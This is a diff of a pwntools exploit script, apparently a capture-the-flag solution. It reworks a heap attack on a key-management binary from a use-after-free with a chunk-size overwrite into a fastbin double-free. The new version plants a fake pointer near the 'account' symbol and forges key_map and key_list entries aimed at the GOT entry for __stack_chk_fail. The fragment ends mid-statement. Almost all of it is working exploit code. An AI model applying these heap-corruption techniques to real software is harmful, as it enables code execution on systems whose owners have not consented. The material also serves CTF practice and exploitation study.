@@ -57,32 +57,20 @@ def exploit():
 
     send_account()
 
-    # create UAF key 1
-    add_key(cyclic(0x100))
-    add_key(cyclic(0x100))
-    add_key(cyclic(0x100))
-    remove_key(0)
+    # make fastbin free list circulate
+    add_key(cyclic(0x50))
+    add_key(cyclic(0x50))
+    add_key(cyclic(0x50))
     remove_key(1)
     remove_key(2)
-    add_key(cyclic(0x230)) # idx 0
-    add_key(cyclic(0x800)) # idx 1
-    remove_key(2)
-
-    # generate target freed fastbin
+    add_key(cyclic(0x50))
+    remove_key(1)
     remove_key(0)
-    add_key(fit({
-        0x238: 0x201, # increase chunk size for key 1
-    }), length=0x300) # idx 0
-    add_key(cyclic(0x50)) # idx 2, target fastbin
     remove_key(2)
-
-    # modify `next` for freed fastbin
-    edit_key(1, fit({
-        0xa8: 0x81,
-        0xb0: elf.symbols['account'] - 0x8,
-    }))
 
     # fake `key_map` and `key_list`
+    add_key(cyclic(0x50), title=p64(elf.symbols['account'] - 0x8))
+    add_key(cyclic(0x50))
     add_key(cyclic(0x50))
     add_key(fit({
         0: elf.got['__stack_chk_fail'] + 0x8,
